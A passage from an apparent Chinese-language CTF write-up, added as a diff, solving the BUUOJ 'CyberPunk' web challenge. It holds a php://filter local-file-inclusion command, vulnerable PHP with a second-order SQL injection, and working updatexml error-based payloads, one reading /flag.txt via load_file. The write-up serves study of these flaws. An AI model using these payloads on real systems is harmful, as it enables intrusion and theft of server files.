@@ -351,3 +351,89 @@ for i in range(1,50):
     print "Flag:"+flag
 
 ```
+
+## Web4 CyberPunk
+
+好吧，源代码里有注释提示file参数
+
+LFI拿到项目源码
+
+```
+curl http://d045b903-f060-43e5-95e9-c9d77fd9c94d.node3.buuoj.cn/?file=php://filter/convert.base64-encode/resource=index.php | head -n 1 |base64 -d > index.php
+```
+
+可以看到这里有很明显的二次注入
+
+```php
+//confrim.php
+    $user_name = $_POST["user_name"];
+    $address = $_POST["address"];//直接没过滤
+    $phone = $_POST["phone"];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
+        $msg = 'no sql inject!';
+    }else{
+        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
+        $fetch = $db->query($sql);
+    }
+
+    if($fetch->num_rows>0) {
+        $msg = $user_name."已提交订单";
+    }else{
+        $sql = "insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)";
+        $re = $db->prepare($sql);
+        $re->bind_param("sss", $user_name, $address, $phone);
+        $re = $re->execute();
+        if(!$re) {
+            echo 'error';
+            print_r($db->error);
+            exit;
+        }
+        $msg = "订单提交成功";
+    }
+//change.php
+    $address = addslashes($_POST["address"]);//单引号转义 但是存入数据库的时候的时候存的还是普通单引号
+    $phone = $_POST["phone"];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
+        $msg = 'no sql inject!';
+    }else{
+        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
+        $fetch = $db->query($sql);
+    }
+
+    if (isset($fetch) && $fetch->num_rows>0){
+        $row = $fetch->fetch_assoc();
+        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];//这里直接拼接$address和之前的$row['address'],存在二次注入
+        $result = $db->query($sql);
+        if(!$result) {
+            echo 'error';
+            print_r($db->error);//可以利用报错注入
+            exit;
+        }
+        $msg = "订单修改成功";
+    } else {
+        $msg = "未找到订单!";
+    }
+```
+
+我们直接构造报错注入试试
+
+先注入，再更新触发
+
+```
+poc:1' where `user_id`=updatexml(1,concat(1,(database())),1)#
+->
+errorXPATH syntax error: 'ctfusers'
+```
+
+然后就是找flag在哪了。。。。
+
+找了半天跟我说要load_file？？？？？
+
+好吧。。。证明sql题flag不一定在库里
+
+```
+payload:1' where `user_id`=updatexml(1,concat(1,(select load_file('/flag.txt'))),1)#
+```
+
+
+
